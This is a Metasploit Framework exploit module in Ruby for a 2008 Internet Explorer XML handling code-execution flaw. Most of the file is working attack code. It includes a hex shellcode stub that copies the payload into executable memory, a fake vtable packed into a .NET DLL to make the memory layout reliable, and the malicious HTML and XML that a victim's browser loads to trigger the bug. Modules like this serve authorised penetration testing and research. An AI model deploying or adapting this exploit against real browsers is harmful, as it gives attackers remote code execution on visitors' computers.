##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Internet Explorer XML Handling Code Execution',
			'Description'    => %q{
				This module exploits a vulnerability in the XML handling code of Internet
			Explorer. In order to execute code reliably, this module uses the .NET DLL
			memory technique pioneered by Alexander Sotirov and Mark Dowd. This method is
			used to create a fake vtable at a known location with all methods pointing
			to our payload. Since the .text segment of the .NET DLL is non-writable, a
			prefixed code stub is used to copy the payload into a new memory segment and
			continue execution from there. This code is a very early version of what
			the final implementation will be and the API and this module will continue
			to be updated as progress continues.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 
				[ 
					'hdm'
				],
			'Version'        => '$Revision$',
			'References'     => 
				[				
					['BID', '32721'],
					['URL', 'http://taossa.com/archive/bh08sotirovdowd.pdf'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Compat'   => 
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,
					
					# Temporary stub virtualalloc() + memcpy() payload to RWX page
					'PrependEncoder' =>
						"\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c"+
						"\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32"+
						"\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07"+
						"\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24"+
						"\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8"+
						"\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64"+
						"\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x54"+
						"\xca\xaf\x91\xff\xd6\x6a\x40\x5e\x56\xc1\xe6\x06\x56\xc1\xe6\x08"+
						"\x56\x6a\x00\xff\xd0\x89\xc3\xeb\x0d\x5e\x89\xdf\xb9\xe8\x03\x00"+
						"\x00\xfc\xf3\xa4\xff\xe3\xe8\xee\xff\xff\xff"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Dec 07 2008',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
	
		ibase = 0x13370000
		vaddr = ibase + 0x2065

		if (request.uri.match(/\.dll$/i))

			print_status("Sending DLL to #{cli.peerhost}:#{cli.peerport}...")

			return if ((p = regenerate_payload(cli)) == nil)
	
			# First entry points to the table of pointers
			vtable  = [ vaddr + 4 ].pack("V")
			cbase   = ibase + 0x2065 + (256 * 4)

			# Build a function table
			255.times { vtable << [cbase].pack("V") }

			# Append the shellcode
			vtable << p.encoded
			send_response(
				cli, 
				Rex::Text.to_dotnetmem(ibase, vtable), 
				{
					'Content-Type' => 'application/x-msdownload',
					'Connection'   => 'close'
				}
			)
			return
		end

		print_status("Sending HTML to #{cli.peerhost}:#{cli.peerport}...")

		addr_a,addr_b = [vaddr].pack("V").unpack("v*").map{|v| "&##{v};" }

		bxml = Rex::Text.to_hex(%Q|
<XML ID=I>
	<X>
		<C>
			<![CDATA[
				<image 
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X					
				>
			 ]]>
		</C>
	</X>
</XML>

<DIV DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
	<XML ID=I></XML>
	<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
	<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=TEXT>	
	<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
	<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=TEXT>
</SPAN>

<script>
	setTimeout('window.location.reload(true);', 250);
</script>
		|, '%')

		html = %Q|<html>
<head>
<script language="javascript">
	function start() {
		document.write(unescape('#{bxml}'));
	}	
</script>
</head>
<body onload="start()">
	<object classid="#{get_resource + "/generic-" + Time.now.to_i.to_s + ".dll"}#GenericControl">
	<object>
</body>
</html>
		|

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })
		
		# Handle the payload
		handler(cli)
	end
end
